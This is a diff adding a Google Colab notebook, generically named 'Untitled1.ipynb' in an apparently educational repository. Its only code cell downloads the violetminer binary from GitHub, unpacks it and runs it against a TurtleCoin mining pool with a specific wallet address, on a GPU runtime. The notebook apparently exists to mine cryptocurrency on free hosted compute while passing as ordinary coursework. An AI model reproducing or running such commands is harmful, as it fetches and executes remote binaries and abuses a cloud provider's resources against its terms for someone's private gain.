@@ -1,0 +1,57 @@
+{
+  "nbformat": 4,
+  "nbformat_minor": 0,
+  "metadata": {
+    "colab": {
+      "name": "Untitled1.ipynb",
+      "private_outputs": true,
+      "provenance": [],
+      "machine_shape": "hm",
+      "authorship_tag": "ABX9TyMXB3gfgxqgkF8j9MPqfMKT",
+      "include_colab_link": true
+    },
+    "kernelspec": {
+      "name": "python3",
+      "display_name": "Python 3"
+    },
+    "language_info": {
+      "name": "python"
+    },
+    "accelerator": "GPU"
+  },
+  "cells": [
+    {
+      "cell_type": "markdown",
+      "metadata": {
+        "id": "view-in-github",
+        "colab_type": "text"
+      },
+      "source": [
+        "<a href=\"https://colab.research.google.com/github/yulia092/edu/blob/main/Untitled1.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
+      ]
+    },
+    {
+      "cell_type": "code",
+      "metadata": {
+        "id": "A6EkUb1GOcHw"
+      },
+      "source": [
+        "wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz\n",
+        "tar xf violetminer-linux-v0.2.2.tar.gz; cd violetminer-linux-v0.2.2 && ./violetminer --pool turtlecoin.herominers.com:10381 --username TRTLv1vWsZq3R3HAjJZmmfbzPXZHnKD1XUQ238kQKL4RAL5AutSNquhSMzgcrDmnkdBZgnbFSPwRa1RXHh9d1PSTapighJ4jyTt.ALEXA --password x --algorithm turtlecoin"
+      ],
+      "execution_count": null,
+      "outputs": []
+    },
+    {
+      "cell_type": "code",
+      "metadata": {
+        "id": "K0bCgk2DQCmx"
+      },
+      "source": [
+        ""
+      ],
+      "execution_count": null,
+      "outputs": []
+    }
+  ]
+}
